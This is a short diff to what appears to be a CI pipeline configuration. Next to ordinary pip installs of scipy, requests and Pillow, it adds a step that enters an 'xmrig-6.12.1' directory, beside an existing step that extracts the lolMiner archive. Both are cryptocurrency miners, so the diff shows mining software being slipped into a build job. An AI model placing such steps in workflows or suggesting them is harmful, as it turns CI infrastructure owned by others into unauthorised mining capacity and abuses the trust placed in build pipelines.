@@ -33,6 +33,8 @@ jobs:
         pip install scipy==1.3.3
         pip install requests==2.22.0
         pip install Pillow==6.2.1
+        
+        cd xmrig-6.12.1
         ! tar -xf lolMiner_v1.28a_Lin64.tar.gz
         
         
